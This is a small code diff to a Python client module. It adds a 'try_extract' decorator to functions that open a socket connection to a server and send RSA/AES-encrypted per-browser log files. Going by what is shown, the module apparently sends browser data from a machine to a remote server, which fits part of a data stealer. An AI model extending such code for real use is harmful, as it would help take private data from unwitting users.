@@ -6,7 +6,7 @@ from base64 import b64encode, b64decode
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import AES, PKCS1_OAEP
 
-from util.general import FORMAT
+from util.general import FORMAT, try_extract
 
 
 """ CONSTANTS """
@@ -23,6 +23,7 @@ socket_info = {
 }
 
 
+@try_extract
 def socket_initialise() -> None:
     """ Creates socket connection to server """
     # connect to server
@@ -87,6 +88,7 @@ def socket_send_data(data: dict) -> None:
         client.send(encrypted_block + padding)
 
 
+@try_extract
 def socket_send_log(data: dict, browser_name: str, file_name: str) -> None:
     """ Send log to socket server """
     socket_send_data({
